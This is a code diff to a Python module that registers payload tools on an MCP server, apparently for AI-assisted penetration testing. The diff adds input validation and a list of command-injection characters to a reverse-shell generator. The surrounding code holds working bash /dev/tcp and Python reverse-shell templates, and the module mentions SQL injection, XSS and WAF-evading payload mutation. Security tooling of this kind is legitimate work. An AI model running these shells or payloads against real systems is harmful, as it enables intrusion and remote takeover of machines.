@@ -4,6 +4,62 @@ Payload工具模块 - Payload生成和变异相关功能
 包含: 反向Shell生成、SQL注入Payload、XSS Payload、智能Payload变异
 """
 
+import re
+from typing import Any, Tuple
+
+
+# 输入验证模式
+# IPv4 地址
+_IPV4_PATTERN = re.compile(
+    r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}'
+    r'(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
+)
+
+# IPv6 地址（简化版）
+_IPV6_PATTERN = re.compile(r'^([0-9a-fA-F]{0,4}:){2,7}[0-9a-fA-F]{0,4}$')
+
+# 主机名（RFC 1123）
+_HOSTNAME_PATTERN = re.compile(
+    r'^(?=.{1,253}$)(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)*'
+    r'[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?$'
+)
+
+# 危险字符（用于命令注入检测）
+_DANGEROUS_CHARS = frozenset([';', '|', '&', '$', '`', '\n', '\r', '>', '<', "'", '"', '\\', '(', ')', '{', '}'])
+
+
+def _validate_host(host: str) -> Tuple[bool, str]:
+    """验证主机地址是否安全"""
+    if not host or not isinstance(host, str):
+        return False, "主机地址不能为空"
+
+    host = host.strip()
+
+    if len(host) > 253:
+        return False, "主机地址过长"
+
+    for char in _DANGEROUS_CHARS:
+        if char in host:
+            return False, f"主机地址包含非法字符: {repr(char)}"
+
+    if _IPV4_PATTERN.match(host) or _IPV6_PATTERN.match(host) or _HOSTNAME_PATTERN.match(host):
+        return True, ""
+
+    return False, "无效的主机地址格式"
+
+
+def _validate_port(port: Any) -> Tuple[bool, str]:
+    """验证端口号是否有效"""
+    try:
+        port_int = int(port)
+    except (ValueError, TypeError):
+        return False, "端口必须是整数"
+
+    if port_int < 1 or port_int > 65535:
+        return False, "端口必须在 1-65535 范围内"
+
+    return True, ""
+
 
 def register_payload_tools(mcp):
     """注册所有Payload工具到 MCP 服务器"""
@@ -11,6 +67,17 @@ def register_payload_tools(mcp):
     @mcp.tool()
     def reverse_shell_gen(lhost: str, lport: int, shell_type: str = "python") -> dict:
         """反向Shell生成器 - 生成各类反向Shell代码"""
+        # 输入验证
+        valid, error = _validate_host(lhost)
+        if not valid:
+            return {"success": False, "error": f"无效的监听地址: {error}"}
+
+        valid, error = _validate_port(lport)
+        if not valid:
+            return {"success": False, "error": f"无效的端口: {error}"}
+
+        lport = int(lport)  # 确保端口为整数
+
         shells = {
             "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
             "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
@@ -157,8 +224,8 @@ def register_payload_tools(mcp):
             变异后的Payload列表
         """
         try:
-            from modules.smart_payload_engine import mutate_payload
-            return mutate_payload(payload, waf)
+            from modules.payload import mutate_payload
+            return mutate_payload(payload, waf=waf)
         except ImportError:
             # 如果模块不可用，提供基础变异
             return _basic_payload_mutation(vuln_type, payload)
